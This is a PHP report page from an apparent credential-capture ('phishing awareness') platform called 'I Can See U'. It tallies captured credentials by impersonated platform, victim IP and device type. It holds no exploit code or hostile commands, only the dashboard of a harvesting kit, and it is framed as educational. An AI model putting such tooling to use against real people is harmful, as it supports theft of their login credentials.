<?php
/**
 * Security Report Generator
 * Generates analysis report of captured credentials
 */

require_once 'utils.php';

$stats = getStatistics();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Report</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
            padding: 20px;
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }

        header {
            border-bottom: 3px solid #ff6b6b;
            padding-bottom: 20px;
            margin-bottom: 30px;
        }

        h1 {
            color: #333;
            margin-bottom: 5px;
        }

        .report-date {
            color: #666;
            font-size: 14px;
        }

        .section {
            margin-bottom: 30px;
        }

        .section h2 {
            color: #ff6b6b;
            font-size: 20px;
            margin-bottom: 15px;
            border-left: 4px solid #ff6b6b;
            padding-left: 10px;
        }

        .stat-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }

        .stat-box {
            background: #f9f9f9;
            padding: 15px;
            border-radius: 5px;
            border-left: 4px solid #ff6b6b;
        }

        .stat-value {
            font-size: 28px;
            font-weight: bold;
            color: #ff6b6b;
        }

        .stat-label {
            color: #666;
            font-size: 14px;
            margin-top: 5px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
        }

        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }

        th {
            background: #f5f5f5;
            font-weight: bold;
            color: #333;
        }

        .warning {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
        }

        .footer {
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid #ddd;
            color: #999;
            font-size: 12px;
            text-align: center;
        }

        print {
            color: #666;
        }

        @media print {
            body {
                background: white;
            }
            .container {
                box-shadow: none;
            }
            .no-print {
                display: none;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>📊 Security Awareness Report</h1>
            <p class="report-date">Generated: <?php echo date('Y-m-d H:i:s'); ?></p>
        </header>

        <div class="warning">
            <strong>⚠️ Educational Purpose:</strong> This report is for security training and awareness purposes only.
        </div>

        <div class="section">
            <h2>📈 Overall Statistics</h2>
            <div class="stat-grid">
                <div class="stat-box">
                    <div class="stat-value"><?php echo $stats['total_captures']; ?></div>
                    <div class="stat-label">Total Captures</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value"><?php echo count($stats['platforms']); ?></div>
                    <div class="stat-label">Platforms Used</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value"><?php echo count($stats['ips']); ?></div>
                    <div class="stat-label">Unique IPs</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value"><?php echo count($stats['devices']); ?></div>
                    <div class="stat-label">Device Types</div>
                </div>
            </div>
        </div>

        <div class="section">
            <h2>📱 Platform Distribution</h2>
            <table>
                <thead>
                    <tr>
                        <th>Platform</th>
                        <th>Attempts</th>
                        <th>Percentage</th>
                    </tr>
                </thead>
                <tbody>
                    <?php 
                    foreach ($stats['platforms'] as $platform => $count):
                        $percentage = ($stats['total_captures'] > 0) ? round(($count / $stats['total_captures']) * 100, 2) : 0;
                    ?>
                        <tr>
                            <td><strong><?php echo htmlspecialchars($platform); ?></strong></td>
                            <td><?php echo $count; ?></td>
                            <td><?php echo $percentage; ?>%</td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>

        <div class="section">
            <h2>💻 Device Distribution</h2>
            <table>
                <thead>
                    <tr>
                        <th>Device Type</th>
                        <th>Attempts</th>
                        <th>Percentage</th>
                    </tr>
                </thead>
                <tbody>
                    <?php 
                    foreach ($stats['devices'] as $device => $count):
                        $percentage = ($stats['total_captures'] > 0) ? round(($count / $stats['total_captures']) * 100, 2) : 0;
                    ?>
                        <tr>
                            <td><?php echo htmlspecialchars($device); ?></td>
                            <td><?php echo $count; ?></td>
                            <td><?php echo $percentage; ?>%</td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>

        <div class="footer">
            <p>Report generated by I Can See U Security Awareness Platform v<?php echo APP_VERSION; ?></p>
            <p>For educational purposes only | <?php echo date('Y'); ?> All Rights Reserved</p>
        </div>
    </div>

    <script>
        // Print-friendly option
        function printReport() {
            window.print();
        }
    </script>
</body>
</html>
